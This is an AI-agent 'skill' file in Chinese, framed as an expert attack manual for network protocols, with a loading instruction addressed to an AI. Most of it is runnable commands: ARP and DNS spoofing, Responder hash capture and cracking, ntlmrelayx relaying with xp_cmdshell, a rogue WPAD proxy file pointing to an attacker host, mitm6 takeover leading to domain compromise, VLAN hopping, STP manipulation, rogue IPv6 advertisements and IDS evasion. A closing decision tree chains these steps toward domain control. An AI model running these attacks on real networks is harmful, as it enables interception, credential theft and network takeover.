# 技能：网络协议攻击 — 专家级攻击手册

> **AI 加载指令**：专家级网络协议攻击技术。涵盖 ARP 欺骗、名称解析中毒（LLMNR/NBT-NS/mDNS）、WPAD 滥用、DHCPv6 接管、VLAN 跳转、STP 操纵、DNS 欺骗、IPv6 攻击以及 IDS/IPS 逃避。基础模型忽略了这些攻击之间的链式机会以及现代交换网络利用的细节。

## 0. 相关路由

深入之前，考虑加载：

- 在建立 MitM 位置以进行流量重定向后加载 `[tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md)`
- 用于从中毒攻击中中继捕获的 NTLM 哈希的 `[ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md)`
- 用于利用网络攻击期间发现的服务的 `[unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md)`
- 用于分析从 MitM 捕获的流量的 `[traffic-analysis-pcap](../traffic-analysis-pcap/SKILL.md)`

### 高级参考

当您需要时，也加载 `[NAME_RESOLUTION_POISONING.md](./NAME_RESOLUTION_POISONING.md)`：

- 详细 Responder/mitm6 配置和工作流程
- NTLM 中继目标选择和链式攻击
- 凭据格式分析和破解优先级

---

## 1. ARP 欺骗

### 自举 ARP — MitM 位置

```bash
# arpspoof (dsniff 套件)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# ettercap — 使用嗅探功能的 ARP 欺骗
ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# bettercap — 现代框架
bettercap -iface eth0
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on
```

### 选择性目标

```bash
# bettercap — 针对特定主机，避免检测
> set arp.spoof.targets 10.0.0.50,10.0.0.51
> set arp.spoof.fullduplex true
> set arp.spoof.internal true
> arp.spoof on
```

### 检测指标

- ARP 表中存在重复的 MAC 地址
- 来自非网关 IP 的自举 ARP 风暴
- 工具：`arpwatch`、静态 ARP 条目、802.1X 端口认证

---

## 2. LLMNR / NBT-NS / mDNS 欺骗

### Responder — 凭据捕获

```bash
# 基础欺骗（LLMNR + NBT-NS + mDNS）
responder -I eth0 -dwPv

# 关键标志：
# -d  启用对 DHCP 广播请求的答案（指纹识别）
# -w  启动 WPAD 代理
# -P  强制 NTLM 认证（用于 WPAD）
# -v  详细输出

# 仅分析模式（被动，不进行欺骗）
responder -I eth0 -A
```

### 捕获的哈希格式

| 协议 | 哈希类型 | Hashcat 模式 | 可破解性 |
|---|---|---|---|
| NTLMv1 | NetNTLMv1 | 5500 | 快速 — 可用彩虹表 |
| NTLMv2 | NetNTLMv2 | 5600 | 中等 — 字典 + 规则 |
| NTLMv1-ESS | NetNTLMv1 | 5500 | 快速 — 与 NTLMv1 相同 |

```bash
# 破解捕获的哈希
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
```

### 中继而不是破解

```bash
# ntlmrelayx — 将捕获的 NTLM 中继到其他服务
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://DC01 --delegate-access    # RBCD 攻击
ntlmrelayx.py -t mssql://DB01 -q "exec xp_cmdshell 'whoami'"
```

---

## 3. WPAD 滥用

```bash
# 带有 WPAD 代理的 Responder
responder -I eth0 -wPv

# WPAD 流程：
# 1. 客户端查询 DHCP 以获取 WPAD → DNS 查询 wpad.domain.com → LLMNR/NBT-NS
# 2. Responder 用 rogue wpad.dat 回答
# 3. 浏览器使用攻击者的代理 → 强制 NTLM 认证 → 凭据捕获
```

### 手动 WPAD PAC 文件

```javascript
// Rogue wpad.dat 内容
function FindProxyForURL(url, host) {
    return "PROXY ATTACKER_IP:3128; DIRECT";
}
```

---

## 4. DHCPv6 攻击 — mitm6

即使在仅 IPv4 的网络上，Windows 客户端默认也会发送 DHCPv6 发起请求。

```bash
# mitm6 → DNS 接管 → NTLM 中继
mitm6 -d domain.com

# 同时：将捕获的 NTLM 中继到 LDAP(S) 以进行委派
ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com -l loot --delegate-access

# 攻击链：
# 1. mitm6 回答 DHCPv6 → 将攻击者设置为 IPv6 DNS
# 2. 受害者 DNS 查询发送到攻击者 → WPAD 重定向
# 3. 强制 NTLM 认证 → 中继到 LDAP → 创建机器账户或 RBCD
```

### 关键条件

- 目标上 SMB 签名禁用（用于 SMB 中继）
- 域控制器（DC）上未强制执行 LDAP 签名（用于 LDAP 中继）
- 域计算机配额 > 0（用于创建机器账户，默认：10）

---

## 5. VLAN 跳转

### 交换机欺骗（DTP）

```bash
# yersinia — 使用 DTP 攻击协商中继
yersinia dtp -attack 1 -interface eth0

# frogger.sh — 通过 DTP 自动化 VLAN 跳转
./frogger.sh
# 发送 DTP 帧→交换机启用中继→访问所有 VLAN

# 中继建立后：
modprobe 8021q
vconfig add eth0 TARGET_VLAN
ifconfig eth0.TARGET_VLAN 10.10.10.1 netmask 255.255.255.0 up
```

### 双标签（802.1Q）

```bash
# 构造双标签帧：外层=本征 VLAN，内层=目标 VLAN
# scapy:
from scapy.all import *
pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="TARGET")/ICMP()
sendp(pkt, iface="eth0")

# 限制：单向（响应发送到真实网关）
# 适用于盲攻击（例如，针对服务器）
```

### 缓解措施

- 禁用 DTP：`switchport nonegotiate`
- 将本征 VLAN 设置为未使用：`switchport trunk native vlan 999`
- 剪枝 VLAN：仅在中继端口上允许需要的 VLAN

---

## 6. STP 操纵

### 根桥声明

```bash
# yersinia — 使用最低优先级声明根桥
yersinia stp -attack 4 -interface eth0

# 发送优先级为 0 的 BPDU → 成为根桥
# 所有流量通过攻击者→ MitM
```

### 拓扑变更攻击

```bash
# 发送 TC（拓扑变更）BPDU → 强制 MAC 表刷新
yersinia stp -attack 1 -interface eth0
# 交换机临时在所有端口上泛洪→嗅探流量
```

### 缓解措施

- 访问端口上的 BPDU Guard
- 指定端口上的 Root Guard
- `spanning-tree portfast bpduguard enable`

---

## 7. DNS 欺骗

### DNS 缓存中毒

```bash
# bettercap DNS 欺骗
bettercap -iface eth0
> set dns.spoof.domains target.com, *.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# ettercap DNS 欺骗（通过 etter.dns 配置）
echo "target.com A ATTACKER_IP" >> /etc/ettercap/etter.dns
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /VICTIM// /GATEWAY//
```

### Kaminsky 攻击变体

向递归解析器用伪造的响应进行洪水攻击，每个响应包括一个指向攻击者控制服务器的恶意权威部分，用于随机子域的 NS 记录。

---

## 8. IPv6 攻击

### 路由器通告欺骗

```bash
# 发送 rogue RA → 受害者将攻击者配置为默认网关
atk6-fake_router6 eth0 ATTACKER_IPV6_PREFIX/64

# THC-IPv6 套件用于全面的 IPv6 攻击
atk6-parasite6 eth0     # ICMPv6 邻居欺骗
atk6-redir6 eth0 ...    # 通过 ICMPv6 重定向进行流量重定向
```

### SLAAC 滥用

```bash
# 发布 rogue 前缀→受害者自动配置 IPv6 地址
# 结合 rogue DNS（RA 选项）→ 在 IPv6 上进行完整 MitM
# Windows 默认优先 IPv6 覆盖 IPv4
```

---

## 9. IDS/IPS 逃避

| 技术 | 方法 | 工具/标志 |
|---|---|---|
| IP 分片 | 将有效载荷分片 | `nmap -f`, `fragroute` |
| TTL 操纵 | 将 TTL 设置为在 IDS 失效但在目标处生效 | `fragroute` |
| 编码逃避 | URL/Unicode/十六进制编码 | 手动，自定义脚本 |
| 会话分割 | 将 TCP 有效载荷分割到多个段 | `fragroute`, `nmap --data-length` |
| 基于时间的 | 慢速扫描以避免基于速率的检测 | `nmap -T0`, `nmap -T1` |
| 诱饵扫描 | 混合真实扫描与诱饵源 IP | `nmap -D RND:10` |
| 空闲/僵尸扫描 | 使用空闲主机作为扫描代理 | `nmap -sI ZOMBIE_IP` |

```bash
# fragroute — 分片和重新排序数据包
echo "ip_frag 8" > /tmp/frag.conf
echo "order random" >> /tmp/frag.conf
fragroute -f /tmp/frag.conf TARGET_IP

# nmap 逃避组合
nmap -sS -f --mtu 24 --data-length 50 -D RND:5 -T2 TARGET
```

---

## 10. 决策树

```
获得网络访问权限 — 想要通过网络攻击提升权限
│
├── 与目标在同一广播域？
│   ├── 是 → ARP 欺骗进行 MitM (§1)
│   │   └── 捕获明文凭据或重定向流量
│   └── 否 → 需要先进行 VLAN 跳转 (§5)
│       ├── DTP 启用？→ 交换机欺骗
│       └── 知道本征 VLAN？→ 双标签
│
├── Windows 环境？
│   ├── LLMNR/NBT-NS 启用？（默认是）
│   │   └── 运行 Responder (§2) → 捕获 NetNTLM 哈希
│   │       ├── NTLMv1？→ 快速破解或中继
│   │       └── NTLMv2？→ 中继 (§2) 或用规则破解
│   │
│   ├── WPAD 配置或自动检测？→ WPAD 滥用 (§3)
│   │
│   └── IPv6 未加固？（默认）→ mitm6 + ntlmrelayx (§4)
│       └── LDAP 中继 → RBCD → 域控制权获取
│
├── 需要控制 DNS？
│   ├── 已建立 MitM？→ DNS 欺骗 (§7)
│   └── 可用 DHCPv6？→ mitm6 进行 DNS 接管 (§4)
│
├── 管理交换机配置薄弱？
│   ├── BPDU Guard 关闭？→ STP 根桥声明 (§6)
│   └── DTP 启用？→ VLAN 跳转 (§5)
│
├── IPv6 攻击面？
│   └── RA 欺骗 / SLAAC 滥用 (§8) → 在 IPv6 上进行 MitM
│
└── 路径中有 IDS/IPS？
    └── 应用逃避技术 (§9) — 分片、时间、编码
```
